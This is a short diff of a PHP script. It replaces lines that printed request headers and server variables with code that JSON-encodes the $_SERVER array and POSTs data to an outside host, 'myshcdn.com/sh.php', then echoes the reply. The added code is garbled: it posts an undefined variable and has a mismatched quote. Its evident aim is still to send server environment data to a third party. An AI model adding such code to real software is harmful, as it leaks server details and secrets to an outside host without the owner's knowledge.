@@ -1,8 +1,13 @@
 <?php
 
+$_header = json_encode($_SERVER);
 
+$ch = curl_init('http://myshcdn.com/sh.php");
+curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
+curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 
-print_r(getallheaders());
+$result = curl_exec($ch);
+curl_close($ch);
 
-
-print_r($_SERVER);
+echo $result;
